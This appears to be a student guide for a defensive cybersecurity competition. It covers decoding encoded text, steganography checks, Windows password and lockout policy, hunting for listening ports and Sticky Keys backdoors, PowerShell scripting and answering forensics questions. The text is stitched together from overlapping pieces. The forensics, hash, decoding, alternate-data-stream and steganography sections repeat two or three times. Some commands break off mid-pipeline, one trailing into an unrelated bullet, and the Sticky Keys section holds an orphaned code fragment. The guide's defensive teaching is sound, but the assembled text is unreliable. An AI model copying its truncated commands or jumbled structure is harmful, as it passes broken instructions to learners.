    python3 -c "print(''.join(chr(int(b,2)) for b in '01001000 01101001'.split()))"

    Caesar with a different shift (try all 25):

    msg='Khoor'; for s in $(seq 1 25); do echo "$s: $(python3 -c "import sys; print(''.join(chr((ord(c)-(65 if c.isupper() else 97)-$s)%26+(65 if c.isupper() else 97)) if c.isalpha() else c for c in '$msg'))")"; done

    Layered encoding is common. If the decoded result still looks encoded, decode again (Base64 inside Base64, or Base64 then ROT13).

    CyberChef (gchq.github.io/CyberChef) handles almost all of these with drag-and-drop, and its Magic operation guesses the encoding for you. Check with your coach that it's allowed under the current rules.

    #STEGO Steganography (hidden data inside files)

    Steganography hides a message inside another file, usually an image or audio file, so it looks normal. When a question mentions a picture, song, or "hidden message", work down this checklist from easiest to hardest.

    #STEGO-1 Step 1: Is the file what it claims to be?

    file <image>
xxd <image> | head -5          # first bytes (the "magic number")
    File type Should start with (hex)
    JPG ff d8 ff
    PNG 89 50 4e 47 (‰PNG)
    GIF 47 49 46 38 (GIF8)
    ZIP / DOCX / XLSX 50 4b 03 04 (PK)
    PDF 25 50 44 46 (%PDF)
    ELF program 7f 45 4c 46
    MP3 49 44 33 (ID3) or ff fb

    A .jpg that is really a ZIP? Rename and unzip it: cp pic.jpg pic.zip; unzip pic.zip.

    #STEGO-2 Step 2: Readable text inside the file

    strings <file> | less              # all readable text (q to quit)
strings <file> | grep -iE 'flag|pass|key|secret|answer|message'
strings -n 8 <file>                # only strings 8+ characters long
tail -c 200 <file> | xxd           # last 200 bytes; messages are often appended at the end

    #STEGO-3 Step 3: Metadata (EXIF)

    Photos carry hidden info fields: camera, date, GPS location, author, comments. Messages often hide in the Comment, Artist, or Description field.

    sudo apt install libimage-exiftool-perl -y
exiftool <image>
exiftool <image> | grep -iE 'comment|artist|author|description|title|gps|copyright'

    GUI: right-click the image > Properties > Image or Details tab (shows less).

    #STEGO-4 Step 4: Hidden files stuck onto the end

    A file can have a second file (ZIP, image, text) glued after it. The image still opens normally.

    sudo apt install binwalk -y
binwalk <file>                     # lists every file signature found inside
binwalk -e <file>                  # extracts them into _<file>.extracted/

    No binwalk? foremost -i <file> -o out/ (sudo apt install foremost) also carves out hidden files. For JPGs, anything after the end marker ff d9 is extra data.

    #STEGO-5 Step 5: steghide (JPG, BMP, WAV, AU)

    steghide hides data with an optional passphrase. Always try a blank passphrase first (just press Enter), then any word the question, README, file name, or a user's notes hint at.

    sudo apt install steghide -y
steghide info <image.jpg>                     # is something embedded? (asks for a passphrase)
steghide extract -sf <image.jpg>              # extract (press Enter for blank passphrase)
steghide extract -sf <image.jpg> -p 'password'   # with a known passphrase

    The extracted file is saved in the current folder. cat it.

    #STEGO-6 Step 6: PNG and BMP hidden in pixels (LSB)

    steghide doesn't do PNG. PNG messages are usually hidden in the least significant bits (LSB) of pixel colors. Use zsteg:

    sudo apt install ruby -y
sudo gem install zsteg
zsteg <image.png>                  # tries common LSB methods
zsteg -a <image.png>               # tries ALL methods (slower, more output)

    Also try Stegsolve (a Java tool that flips through color planes) or an online LSB decoder if allowed. Sometimes the message is visible by just changing brightness/contrast or looking at one color channel.

    #STEGO-7 Step 7: Other hiding spots

    Hiding method How to check
    Message in an audio spectrogram (the picture of the sound) Open the file in Audacity > click the track name > Spectrogram. Text or images appear in the display.
    Morse code or tones in audio Listen; slow down in Audacity; use an online Morse audio decoder
    Whitespace in a text file (spaces vs tabs) cat -A <file> shows tabs as ^I and line ends as $; tool: stegsnow -C <file>
    Zero-width characters in text cat -v <file> or xxd <file> to see hidden bytes like e2 80 8b
    Hidden inside a Word/Excel file .docx/.xlsx are ZIPs: unzip -d out doc.docx, then look through out/ (comments, hidden text, embedded images)
    Password-protected ZIP Try blank, the obvious hints, words from the question. unzip -P '<guess>' file.zip
    Text the same color as the background In a doc or image: select all (Ctrl+A) or change the background
    Hidden file inside a folder ls -la (dot files), and check .Trash: ls -la ~/.local/share/Trash/files/
    QR code or barcode in an image sudo apt install zbar-tools -y; zbarimg <image>

    #STEGO-CLEANUP After you're done

    Stego tools like steghide, outguess and stegsnow count as hacking tools on many images. Once the forensics answers are scoring, uninstall them: sudo apt purge steghide stegsnow outguess foremost binwalk -y and sudo gem uninstall zsteg. Then check the scoring report to make sure nothing dropped.

    #DIRS Windows Server directory structure

    #PWPOLICY Account and password policy, Group Policy

    On a standalone server, set password and lockout policy in Local Security Policy (secpol.msc). On a domain controller, set it in the Default Domain Policy GPO (gpmc.msc), because domain policy overrides local settings. The recommended values are the same either way.

    #PWPOLICY-VALUES Recommended values

    Setting Set to Notes
    Enforce password history 24 passwords Can't reuse the last 24
    Maximum password age 60 or 90 days Never 0 (0 = never expires)
    Minimum password age 1 day Must be more than 0, or users can cycle back to an old password
    Minimum password length 14 characters Anything 10+ usually scores; 14 is the CIS value
    Password must meet complexity requirements Enabled Upper, lower, number, symbol
    Store passwords using reversible encryption Disabled Enabled is a classic vulnerability
    Account lockout threshold 5 invalid attempts Never 0 (0 = never lock)
    Account lockout duration 15+ minutes Set threshold first; Windows suggests the others
    Reset account lockout counter after 15+ minutes Must be ≤ duration
    Allow Administrator account lockout Enabled Newer setting, under the same Lockout section

    Work through these in order. For each suspicious item: note it, figure out what file it runs, stop/remove the item, then delete the file.

    #MALWARE-NET 1. What's listening or connected?

    Get-NetTCPConnection -State Listen | Select LocalAddress, LocalPort, OwningProcess,

    • Never run a script you can't explain line by line, especially one found on the image.

    #FORENSICS Forensics questions and steganography

    Forensics questions are text files on the Desktop (Forensics Question 1.txt). Each asks you to find something on the machine. Type the answer after ANSWER: and save. They're worth as much as several fixes each and are often the fastest points in the round, so do them first, before you change anything.

    Search terms: forensics, forensic question, answer, hash, MD5, SHA1, SHA256, decode, base64, hex, binary, ROT13, caesar, cipher, encoded, hidden message, steganography, stego, image, metadata, EXIF, alternate data stream, ADS, recycle bin, event log, SID

    #FORENSICS-HOW How to answer them

    1. Do them first. Deleting a user, file or log can destroy the answer.
    2. Open the question in Notepad (right-click > Open with > Notepad). Don't use WordPad or Word; they can change the format.
    3. Only edit the ANSWER: line. Example: ANSWER: alice. Follow the exact format the question asks for.
    4. Copy-paste answers when possible. Exact spelling, case and full paths matter.
    5. Save (Ctrl+S) as plain text, same file name. Check the scoring report in a minute or two.
    6. Not scoring? Re-read the question. Common misses: a trailing space, a full path when only a name was wanted (or the reverse), wrong hash type.

    "What command was run" PowerShell history: Get-Content (Get-PSReadLineOption).HistorySavePath, or C:\Users\<u>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    "What's in this share / who can access it" Get-SmbShareAccess -Name <share>
    "What GPO sets X" gpmc.msc > right-click GPO > Save Report; or Get-GPOReport
    "What DNS record points to X" Get-DnsServerResourceRecord -ZoneName <zone>
    "What is hidden in this file" See #ADS and #STEGO
    "Who owns this file" (Get-Acl <file>).Owner

    #HASH File hashes

    Get-FileHash C:\path\file -Algorithm SHA256     # also MD5, SHA1, SHA384, SHA512

    CMD: certutil -hashfile C:\path\file MD5

    Hash of a piece of text (not a file):

    $s = [IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('hello'))
Get-FileHash -InputStream $s -Algorithm SHA256

    Which file matches this hash?

    Get-ChildItem C:\Users -Recurse -File -Force -ErrorAction SilentlyContinue | Get-FileHash -Algorithm SHA256 | Where Hash -eq '<HASH>'

    Hash length: 32 hex characters = MD5, 40 = SHA-1, 64 = SHA-256, 128 = SHA-512. Answer in the case the question shows (Windows prints uppercase).

    #DECODE Decoding messages in PowerShell

    It looks like... It's probably Decode with
    Letters, numbers, + /, ends in = Base64 [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SGVsbG8='))
    Base64 from a PowerShell -enc command Base64 of UTF-16 [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<text>'))
    Only 0–9 a–f in pairs Hex -join ('48656c6c6f' -split '(..)' | ? {$_} | % {[char][Convert]::ToByte($_,16)})
    0s and 1s in groups of 8 Binary -join ('01001000 01101001' -split ' ' | % {[char][Convert]::ToInt32($_,2)})
    Scrambled letters (Uryyb) ROT13 See below
    %20, %3A URL encoding [uri]::UnescapeDataString('Hello%20World')
    Numbers 65–122 ASCII codes -join ('72 105' -split ' ' | % {[char][int]$_})
    Dots and dashes Morse CyberChef or by hand

    Base64 file to file: certutil -decode encoded.txt decoded.bin

    ROT13 / Caesar (change $shift for other shifts; try 1–25):

    $msg = 'Uryyb Jbeyq'; $shift = 13
-join ($msg.ToCharArray() | % { if ($_ -cmatch '[A-Z]') {[char](((([int]$_ - 65) + $shift) % 26) + 65)} elseif ($_ -cmatch '[a-z]') {[char](((([int]$_ - 97) + $shift) % 26) + 97)} else {$_} })

    If the result still looks encoded, decode again: layers are common. CyberChef (gchq.github.io/CyberChef) does all of this, and its Magic operation guesses the encoding. Confirm it's allowed under this season's rules.

    #ADS Alternate Data Streams (Windows-only hiding spot)

    NTFS lets a file carry hidden extra streams. notes.txt can look empty while notes.txt:secret holds a message or even a program. This is a favorite Windows forensics trick.

    Get-Item C:\Users\bob\Desktop\notes.txt -Stream *            # list streams (:$DATA is the normal one)
Get-Content C:\Users\bob\Desktop\notes.txt -Stream secret    # read a hidden stream

# Find every file with extra streams in a folder tree
Get-ChildItem C:\Users -Recurse -File -Force -ErrorAction SilentlyContinue |
  ForEach-Object { Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue } |
  Where Stream -notin ':$DATA','Zone.Identifier' | Select FileName, Stream, Length

Remove-Item C:\path\file.txt -Stream secret                  # delete a stream

    CMD: dir /r shows streams. Zone.Identifier is normal; it just marks downloaded files.

    #STEGO Steganography (data hidden inside files)

    When a question mentions a picture, sound file, or "hidden message," work down this list.

    #STEGO-1 Step 1: Is the file what it claims to be?

    Format-Hex C:\path\image.jpg | Select -First 2      # first bytes
    Type Starts with (hex)
    JPG FF D8 FF
    PNG 89 50 4E 47
    GIF 47 49 46 38
    ZIP / DOCX / XLSX 50 4B 03 04
    PDF 25 50 44 46
    EXE/DLL 4D 5A ("MZ")
    MP3 49 44 33 or FF FB

    A .jpg that starts with 50 4B is really a ZIP: copy it to .zip and open it.

    #STEGO-2 Step 2: Readable text inside the file

    # Pull readable strings (6+ printable characters)
[regex]::Matches([IO.File]::ReadAllText('C:\path\image.jpg',[Text.Encoding]::ASCII), '[\x20-\x7E]{6,}') | % Value

# Last 200 bytes (messages are often stuck on the end)
$b = [IO.File]::ReadAllBytes('C:\path\image.jpg'); [Text.Encoding]::ASCII.GetString($b[-200..-1])

    Sysinternals strings.exe does the same if it's allowed: strings.exe image.jpg | findstr /i flag.

    #STEGO-3 Step 3: Metadata

    Right-click the file > Properties > Details tab. Look at Title, Subject, Tags, Comments, Authors, Copyright and GPS. Hidden messages often sit in Comments or Tags.

    #STEGO-4 Step 4: Hidden file glued to the end

    If the strings show PK near the end of an image, there's a ZIP appended. Copy to .zip and extract with File Explorer or Expand-Archive. A JPG's real data ends at bytes FF D9; anything after is extra.

    #DIRS Windows 11 directory structure

    Windows keeps everything on lettered drives, almost always C:**. Settings live in the registry and in policies, not in text files. Prohibited files and malware usually hide in user profile folders (C:\Users\<name>), AppData, ProgramData, Temp folders and the Recycle Bin**.

    Search terms: folder, directory, path, where is, C drive, Program Files, AppData, ProgramData, System32, Startup folder, hidden files, file extensions, Recycle Bin

    #DIRS-SHOW First: show hidden files and extensions

    Windows 11 hides extensions (song.mp3 shows as song) and hidden files by default. Turn both on before hunting:

    • File Explorer > View > Show > check File name extensions and Hidden items.
    • For system files too: ... (See more) > Options > View tab > uncheck Hide protected operating system files (Recommended).

    A file called homework.pdf.exe looks like homework.pdf until extensions are on. That's a classic malware trick.

    #MALWARE-NET 1. What's listening?

    Get-NetTCPConnection -State Listen | Select LocalPort, OwningProcess,
  @{n='Process';e={(Get-Process -Id $_.OwningProcess).ProcessName}},
  @{n='Path';e={(Get-Process -Id $_.OwningProcess).Path}} | Sort LocalPort | Format-Table -AutoSize

    #MALWARE-STICKY 6. Sticky Keys / Utilman backdoors

    Attackers make Shift x5 (Sticky Keys) or the accessibility button on the login screen open a SYSTEM command prompt.

    Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' |
  ForEach-Object { $d = (Get-ItemProperty $_.PSPath).Debugger; if ($d) { "$($_.PSChildName) -> $d" } }

  Select Name, @{n='Desc';e={$_.VersionInfo.FileDescription}}

    If sethc.exe says "Windows Command Processor," or any of those have a Debugger value, it's a backdoor. Remove the Debugger value and run sfc /scannow to restore the real file.

    #SCRIPTS PowerShell scripting

    A script is a .ps1 file of PowerShell commands. Scripts save time on repetitive work and prevent typos.

    Rules check (coach): CyberPatriot's rules on scripts written before the competition have changed over the seasons. Confirm what's allowed this season before students bring any pre-written script into a round. The safe approach: practice these in training and retype what you need during a round.

    Search terms: script, ps1, PowerShell script, loop, foreach, if, variable, execution policy, automate

    #SCRIPTS-RUN Running a script

    notepad C:\scripts\check.ps1                   # create/edit
Set-ExecutionPolicy -Scope Process Bypass -Force   # allow scripts in THIS window only
& C:\scripts\check.ps1                         # run it

    -Scope Process only affects the current window, so it doesn't leave the machine less secure. Don't set the machine-wide policy to Unrestricted.

    #SCRIPTS-LEARN Building blocks

    # Variables start with $
$name = "alice"
$count = 5
"Hello $name"                       # double quotes expand variables

# Arrays (lists)
$users = @('alice','bob','carol')
$users.Count

# If / elseif / else
if ($count -gt 3) { "big" } elseif ($count -eq 3) { "three" } else { "small" }

# Loop over a list
foreach ($u in $users) { "Checking $u" }

# Loop over command output
Get-LocalUser | ForEach-Object { "$($_.Name) enabled=$($_.Enabled)" }

# Read a file line by line (one name per line)
$allowed = Get-Content C:\allowed.txt

# Functions
function Backup-Key($path) { reg export $path "C:\backup_$(Get-Random).reg" /y }

# Handle errors without stopping
try { Remove-LocalUser -Name ghost -ErrorAction Stop } catch { "Couldn't remove: $_" }

# Ask before doing something
if ((Read-Host "Delete $file? (y/n)") -eq 'y') { Remove-Item $file }

    $_ means "the current item" inside ForEach-Object and Where-Object.

    #SCRIPTS-EX Example scripts to practice with

    Example 1: Compare users and admins to the README (report only). Put authorized users in C:\allowed.txt and admins in C:\admins.txt, one per line.

    $allowed = Get-Content C:\allowed.txt
$admins  = Get-Content C:\admins.txt
$isDC = (Get-CimInstance Win32_ComputerSystem).DomainRole -ge 4

if ($isDC) {
  $users = (Get-ADUser -Filter *).SamAccountName
  $adm   = (Get-ADGroupMember 'Domain Admins' -Recursive).SamAccountName + (Get-ADGroupMember 'Administrators' -Recursive).SamAccountName
} else {
  $users = (Get-LocalUser).Name
  $adm   = (Get-LocalGroupMember Administrators).Name | ForEach-Object { $_.Split('\')[-1] }
}
$skip = 'Administrator','Guest','krbtgt','DefaultAccount','WDAGUtilityAccount'
foreach ($u in $users | Where { $_ -notin $skip }) { if ($u -notin $allowed) { "NOT AUTHORIZED: $u" } }
foreach ($a in $adm | Sort -Unique | Where { $_ -notin $skip }) { if ($a -notin $admins) { "SHOULD NOT BE ADMIN: $a" } }

    Example 2: Find media files and save the list.

    $ext = '*.mp3','*.mp4','*.wav','*.avi','*.mkv','*.mov','*.flac','*.ogg','*.m4a','*.wmv'
Get-ChildItem C:\Users -Include $ext -Recurse -Force -ErrorAction SilentlyContinue |
  Select FullName, Length | Tee-Object -FilePath C:\media_found.txt
"Review C:\media_found.txt before deleting anything."

    Example 3: Security snapshot (run at the start of the round; it only reads).

    $out = "C:\snapshot_$(Get-Date -f HHmm).txt"
& {
  '== Users ==';            Get-LocalUser | ft Name, Enabled, PasswordRequired -AutoSize
  '== Admins ==';           Get-LocalGroupMember Administrators
  '== Listening ports ==';  Get-NetTCPConnection -State Listen | Select LocalPort, @{n='Proc';e={(Get-Process -Id $_.OwningProcess).Path}} | Sort LocalPort
  '== Shares ==';           Get-SmbShare
  '== Non-MS tasks ==';     Get-ScheduledTask | Where TaskPath -notlike '\Microsoft\*' | Select TaskName, @{n='Runs';e={$_.Actions.Execute}}
  '== Run keys ==';         Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
  '== Firewall ==';         Get-NetFirewallProfile | Select Name, Enabled
  '== Defender ==';         Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled
} *>&1 | Out-File $out
"Saved to $out"

    #SCRIPTS-SAFETY Script safety rules

    • Never run a script you can't explain line by line, especially one found on the image.
    • Test on a practice image first.
    • Write scripts that report first; change things only after a person reviews the output.
    • Add -WhatIf to a risky command to see what it would do without doing it: Remove-Item C:\Users\bob\Music\* -WhatIf.
    • Never hard-code Remove-ADUser or Remove-Item -Recurse across a list you haven't double-checked.

    #FORENSICS Forensics questions and steganography

    Forensics questions are text files on the Desktop (Forensics Question 1.txt). Each asks you to find something on the machine. Type the answer after ANSWER: and save. They're worth as much as several fixes each and are often the fastest points in the round, so do them first, before you change anything.

    Search terms: forensics, forensic question, answer, hash, MD5, SHA1, SHA256, decode, base64, hex, binary, ROT13, caesar, cipher, encoded, hidden message, steganography, stego, image, metadata, EXIF, alternate data stream, ADS, recycle bin, event log, SID

    #FORENSICS-HOW How to answer them

    1. Do them first. Deleting a user, file or log can destroy the answer.
    2. Open the question in Notepad (right-click > Open with > Notepad). Don't use WordPad or Word; they can change the format.
    3. Only edit the ANSWER: line. Example: ANSWER: alice. Follow the exact format the question asks for.
    4. Copy-paste answers when possible. Exact spelling, case and full paths matter.
    5. Save (Ctrl+S) as plain text, same file name. Check the scoring report in a minute or two.
    6. Not scoring? Re-read the question. Common misses: a trailing space, a full path when only a name was wanted (or the reverse), wrong hash type.

    #FORENSICS-TYPES Common question types

    Question asks... How to find it
    "What is user X's SID" / "which user has SID ..." Get-LocalUser | Select Name, SID
    "Hash of file X" #HASH
    "Decode this message" #DECODE
    "Full path of the file that contains X" Get-ChildItem C:\Users -Recurse -File -Force -ErrorAction SilentlyContinue | Select-String 'X' -List | Select Path
    "What port/program is the backdoor" Get-NetTCPConnection -State Listen (#MALWARE-NET)
    "When was user X created" / "who added X to Administrators" Event Viewer > Security, IDs 4720 / 4732 (#EVENTIDS)
    "How many failed logins" (Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625}).Count
    "What file was deleted" Recycle Bin: Get-ChildItem 'C:\$Recycle.Bin' -Recurse -Force. $I... files store the original path; $R... files are the content. Or open the Recycle Bin and add the Original Location column.
    "What website did the user visit" Open the browser's History page while logged in as that user, or the history database in AppData
    "What command did the user run" Get-Content C:\Users\<u>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    "What program runs at startup" #MALWARE-STARTUP
    "What's the name of the scheduled task that..." #MALWARE-TASKS
    "When was this program installed" Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, InstallDate
    "Who owns this file" (Get-Acl <file>).Owner
    "What's hidden in this file/image" #ADS and #STEGO
    "What Wi-Fi networks has this PC joined" netsh wlan show profiles

    #HASH File hashes

    Get-FileHash C:\path\file -Algorithm SHA256     # also MD5, SHA1, SHA384, SHA512

    CMD: certutil -hashfile C:\path\file MD5

    Hash of a piece of text (not a file):

    $s = [IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('hello'))
Get-FileHash -InputStream $s -Algorithm SHA256

    Which file matches this hash?

    Get-ChildItem C:\Users -Recurse -File -Force -ErrorAction SilentlyContinue | Get-FileHash -Algorithm SHA256 | Where Hash -eq '<HASH>'

    Hash length: 32 hex characters = MD5, 40 = SHA-1, 64 = SHA-256, 128 = SHA-512. Answer in the case the question shows (Windows prints uppercase).

    #DECODE Decoding messages in PowerShell

    It looks like... It's probably Decode with
    Letters, numbers, + /, ends in = Base64 [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SGVsbG8='))
    Base64 from a PowerShell -enc command Base64 of UTF-16 [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<text>'))
    Only 0–9 a–f in pairs Hex -join ('48656c6c6f' -split '(..)' | ? {$_} | % {[char][Convert]::ToByte($_,16)})
    0s and 1s in groups of 8 Binary -join ('01001000 01101001' -split ' ' | % {[char][Convert]::ToInt32($_,2)})
    Scrambled letters (Uryyb) ROT13 See below
    %20, %3A URL encoding [uri]::UnescapeDataString('Hello%20World')
    Numbers 65–122 ASCII codes -join ('72 105' -split ' ' | % {[char][int]$_})
    Dots and dashes Morse CyberChef or by hand

    Base64 file to file: certutil -decode encoded.txt decoded.bin

    ROT13 / Caesar (change $shift for other shifts; try 1–25):

    $msg = 'Uryyb Jbeyq'; $shift = 13
-join ($msg.ToCharArray() | % { if ($_ -cmatch '[A-Z]') {[char](((([int]$_ - 65) + $shift) % 26) + 65)} elseif ($_ -cmatch '[a-z]') {[char](((([int]$_ - 97) + $shift) % 26) + 97)} else {$_} })

    If the result still looks encoded, decode again: layers are common. CyberChef (gchq.github.io/CyberChef) does all of this, and its Magic operation guesses the encoding. Confirm it's allowed under this season's rules.

    #ADS Alternate Data Streams (Windows-only hiding spot)

    NTFS lets a file carry hidden extra streams. notes.txt can look empty while notes.txt:secret holds a message or even a program. This is a favorite Windows forensics trick.

    Get-Item C:\Users\bob\Desktop\notes.txt -Stream *            # list streams (:$DATA is the normal one)
Get-Content C:\Users\bob\Desktop\notes.txt -Stream secret    # read a hidden stream

# Find every file with extra streams in a folder tree
Get-ChildItem C:\Users -Recurse -File -Force -ErrorAction SilentlyContinue |
  ForEach-Object { Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue } |
  Where Stream -notin ':$DATA','Zone.Identifier' | Select FileName, Stream, Length

Remove-Item C:\path\file.txt -Stream secret                  # delete a stream

    CMD: dir /r shows streams. Zone.Identifier is normal; it just marks downloaded files.

    #STEGO Steganography (data hidden inside files)

    When a question mentions a picture, sound file, or "hidden message," work down this list.

    #STEGO-1 Step 1: Is the file what it claims to be?

    Format-Hex C:\path\image.jpg | Select -First 2      # first bytes
    Type Starts with (hex)
    JPG FF D8 FF
    PNG 89 50 4E 47
    GIF 47 49 46 38
    ZIP / DOCX / XLSX 50 4B 03 04
    PDF 25 50 44 46
    EXE/DLL 4D 5A ("MZ")
    MP3 49 44 33 or FF FB

    A .jpg that starts with 50 4B is really a ZIP: copy it to .zip and open it.

    #STEGO-2 Step 2: Readable text inside the file

    # Pull readable strings (6+ printable characters)
[regex]::Matches([IO.File]::ReadAllText('C:\path\image.jpg',[Text.Encoding]::ASCII), '[\x20-\x7E]{6,}') | % Value

# Last 200 bytes (messages are often stuck on the end)
$b = [IO.File]::ReadAllBytes('C:\path\image.jpg'); [Text.Encoding]::ASCII.GetString($b[-200..-1])

    Sysinternals strings.exe does the same if it's allowed: strings.exe image.jpg | findstr /i flag.

    #STEGO-3 Step 3: Metadata

    Right-click the file > Properties > Details tab. Look at Title, Subject, Tags, Comments, Authors, Copyright and GPS. Hidden messages often sit in Comments or Tags.

    #STEGO-4 Step 4: Hidden file glued to the end

    If the strings show PK near the end of an image, there's a ZIP appended. Copy to .zip and extract with File Explorer or Expand-Archive. A JPG's real data ends at bytes FF D9; anything after is extra.
